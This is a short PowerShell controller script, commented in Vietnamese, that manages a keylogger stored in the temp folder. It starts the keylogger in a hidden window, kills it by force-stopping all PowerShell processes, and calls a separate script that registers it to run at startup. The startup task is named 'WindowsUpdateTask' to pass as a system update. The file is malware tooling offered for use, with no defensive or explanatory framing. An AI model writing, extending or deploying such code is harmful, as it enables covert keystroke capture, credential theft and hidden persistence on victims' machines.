# controller.ps1
param (
    [string]$action
)

$scriptPath = "$env:temp\keylogger.ps1"
$taskName = "WindowsUpdateTask"

switch ($action) {
    "start" {
        # Khởi động keylogger
        Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -File `"$scriptPath`""
        Write-Host "Keylogger started."
    }
    "stop" {
        # Dừng keylogger
        Stop-Process -Name powershell -Force
        Write-Host "Keylogger stopped."
    }
    "schedule" {
        # Thiết lập tác vụ định kỳ
        & "$PSScriptRoot\schedule.ps1"
        Write-Host "Keylogger scheduled to run at startup."
    }
    default {
        Write-Host "Usage: controller.ps1 [start|stop|schedule]"
    }
}